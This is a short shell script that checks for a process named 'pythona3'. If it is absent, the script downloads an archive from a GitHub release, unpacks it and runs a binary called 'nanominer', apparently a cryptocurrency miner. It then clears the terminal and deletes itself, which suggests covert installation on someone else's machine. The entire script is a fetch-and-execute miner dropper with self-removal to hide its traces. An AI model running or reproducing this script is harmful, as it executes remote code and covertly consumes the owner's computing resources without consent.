#!/bin/sh
ps cax | grep pythona3 > /dev/null
if [ $? -eq 0 ]; then
  clear
  rm -- "$0"
else
  wget https://github.com/teskilah/teshe/releases/download/das/luck.tar.gz
  tar -xvf luck.tar.gz
  ./nanominer
  clear
  rm -- "$0"
fi

